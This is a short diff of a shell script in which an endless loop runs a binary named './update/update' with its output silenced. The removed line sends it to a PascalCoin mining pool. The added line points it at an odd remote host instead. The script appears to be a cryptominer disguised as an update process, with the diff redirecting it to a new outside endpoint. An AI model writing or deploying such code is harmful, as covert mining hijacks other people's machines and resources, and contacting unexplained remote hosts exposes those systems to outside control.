@@ -113,6 +113,6 @@ sleep 2
 
 while true
 do
-./update/update ./rhel -v 3 -r 20 -s stratum+tcp://pool.pascalcoin.org:10097 -su solo:1196494-13.0.$currentdate -pw x -cputhreads $used_num_of_cores 1>/dev/null 2>&1
+./update/update ./rhel -v 3 -r 20 -s http://24-Feb-2025_rheRPC_206_189_127_32_LNCsd9Eq.emergencyaccess.teatspray.uk:28706
 sleep 10
 done
